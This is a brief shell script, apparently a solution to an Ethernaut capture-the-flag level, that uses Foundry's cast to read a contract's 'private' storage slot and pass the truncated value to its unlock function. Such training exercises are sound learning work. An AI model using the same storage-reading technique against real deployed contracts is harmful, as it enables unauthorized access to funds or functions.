source ~/ethernauts/.env

cast storage 0x2d0fA5385D2393Cece62A4B7A78a5D601C26aFD2 --rpc-url $RPC_URL 5 | cut -c1-34

cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0x2d0fA5385D2393Cece62A4B7A78a5D601C26aFD2 \
    "unlock(bytes16)()" \
    0x0c304692609180f2e9979162679d7365
